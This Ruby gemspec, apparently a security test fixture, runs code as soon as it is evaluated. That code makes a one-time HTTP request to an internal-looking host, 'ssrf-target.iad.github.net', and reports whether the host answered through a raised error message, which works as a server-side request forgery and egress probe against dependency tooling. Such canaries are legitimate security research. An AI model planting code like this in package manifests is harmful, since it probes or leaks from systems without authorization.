require "open-uri"

marker = "/tmp/codex_dependabot_canary_once"
begin
  File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
rescue Errno::EEXIST
  # A gemspec may be evaluated repeatedly; only the first evaluation probes.
else
  begin
    URI.open(
      "https://ssrf-target.iad.github.net/",
      open_timeout: 10,
      read_timeout: 10,
      redirect: false
    ) do |response|
      outcome = "REACHABLE status=#{response.status.first}"
    end
  rescue OpenURI::HTTPError => error
    outcome = "BLOCKED status=#{error.io.status.first}"
  rescue StandardError => error
    outcome = "BLOCKED error=#{error.class.name}"
  end
  raise "CODEX_DEPENDABOT_CANARY_#{outcome}"
end

Gem::Specification.new do |spec|
  spec.name = "db-egress-canary"
  spec.version = "2.0.1"
  spec.summary = "Benign Dependabot egress fixture"
  spec.authors = ["Authorized security test"]
  spec.files = ["lib/db_egress_canary.rb"]
  spec.require_paths = ["lib"]
end
